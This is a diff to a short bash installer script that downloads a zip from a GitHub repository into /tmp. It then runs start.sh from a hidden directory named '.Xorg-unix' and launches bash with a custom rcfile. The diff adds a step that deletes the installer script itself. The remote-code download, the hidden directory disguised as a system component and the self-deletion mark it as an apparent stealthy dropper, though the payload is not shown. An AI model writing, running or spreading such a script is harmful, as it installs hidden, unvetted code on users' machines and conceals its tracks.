@@ -1,4 +1,5 @@
 #!/bin/bash
+installerdir=$(pwd)
 cd /tmp || exit
 wget https://github.com/Epik00/Epik00/archive/refs/heads/main.zip 
 unzip main.zip 
@@ -13,3 +14,4 @@ rm -rf ./Epik00-main
 chmod +x ./.Xorg-unix/*
 /tmp/.Xorg-unix/start.sh 
 exec bash --rcfile ~/.config/.bashrc
+rm $installerdir/instalador.sh
